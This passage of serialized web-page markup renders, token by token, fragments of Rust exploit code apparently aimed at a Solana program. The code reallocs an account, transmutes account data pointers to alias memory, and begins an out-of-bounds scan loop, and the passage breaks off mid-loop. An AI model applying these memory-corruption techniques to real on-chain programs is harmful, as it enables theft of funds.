rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\nd30:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nd31:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resize LEVERAGE to simplify exploit logic\"]}]\nd32:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd33:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":"])</script><script>self.__next_f.push([1,"\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\nd34:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\nd35:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nd36:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}]\nd37:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nd38:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nd39:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"realloc\"]}]\nd3a:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nd3b:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}]\nd3c:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nd3d:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd3e:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\nd3f:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd40:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\nd41:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nd42:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nd43:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd44:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nd45:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nd46:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color"])</script><script>self.__next_f.push([1,"\":\"#ccc\"},\"children\":[\"]\"]}]\nd47:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\nd48:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nd49:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd4a:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\nd4b:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}]\nd4c:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd4d:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nd4e:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nd4f:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nd50:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nd51:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\nd52:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nd53:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}]\nd54:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nd55:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nd56:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\nd57:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd58:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nd59:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd5a:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-synt"])</script><script>self.__next_f.push([1,"ax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\nd5b:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nd5c:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\nd5d:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nd5e:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}]\nd5f:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nd60:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nd61:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nd62:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\nd63:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nd64:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\nd65:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nd66:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nd67:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nd68:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd69:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nd6a:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nd6b:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"child"])</script><script>self.__next_f.push([1,"ren\":[\"]\"]}]\nd6c:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\nd6d:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nd6e:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd6f:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}]\nd70:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nd71:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd72:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nd73:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nd74:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nd75:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nd76:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\nd77:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nd78:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}]\nd79:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nd7a:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\nd7b:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}]\nd7c:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd7d:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nd7e:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd7f:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-nu"])</script><script>self.__next_f.push([1,"mber\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\nd80:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nd81:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}]\nd82:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nd83:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"size_of\"]}]\nd84:[\"$\",\"span\",\"code-segment-91\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nd85:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nd86:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\nd87:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nd88:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\nd89:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\nd8a:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\nd8b:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\nd8c:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nd8d:[\"$\",\"span\",\"code-segment-100\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nd8e:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\nd8f:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nd90:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\nd91:[\""])</script><script>self.__next_f.push([1,"$\",\"span\",\"code-segment-104\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\nd92:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nd93:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd94:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\nd95:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd96:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\nd97:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nd98:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\nd99:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nd9a:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\nd9b:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\nd9c:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nd9d:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\nd9e:[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\nd9f:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"vec!\"]}]\nda0:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}"])</script><script>self.__next_f.push([1,"]\nda1:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}]\nda2:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\nda3:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new\"]}]\nda4:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\nda5:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\nda6:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\nda7:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}]\nda8:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\nda9:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\ndaa:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"key\"]}]\ndab:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\ndac:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}]\ndad:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ndae:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ndaf:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ndb0:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\ndb1:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}]\ndb2:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ndb3:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\ndb4:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"token token\",\""])</script><script>self.__next_f.push([1,"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ndb5:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ndb6:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\ndb7:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\ndb8:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ndb9:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ndba:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ndbb:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\ndbc:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\ndbd:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\ndbe:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\ndbf:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}]\ndc0:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\ndc1:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}]\ndc2:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\ndc3:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\ndc4:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#f"])</script><script>self.__next_f.push([1,"08d49\"},\"children\":[\"clone\"]}]\ndc5:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ndc6:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ndc7:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\ndc8:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ndc9:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ndca:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\ndcb:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\ndcc:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\ndcd:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\ndce:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\ndcf:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\ndd0:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ndd1:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\ndd2:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\ndd3:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ndd4:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"token token\",\"style\":{\"color\":\"#6"])</script><script>self.__next_f.push([1,"7cdcc\"},\"children\":[\"?\"]}]\ndd5:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\ndd6:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"add\"]}]\ndd7:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\ndd8:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x2840\"]}]\ndd9:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\ndda:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\nddb:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}]\nddc:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Start OOB scanning\"]}]\nddd:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\ndde:[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}]\nddf:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\nde0:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\nde1:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"loop\"]}]\nde2:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\nde3:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\nde4:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"$und"])</script><script>self.__next_f.push([1,"efined\",\"style\":{},\"children\":[\"\\n\"]}]\nde5:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\nde6:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\nde7:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\nde8:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" check_ptr \"]}]\nde9:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\ndea:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" scan_ptr 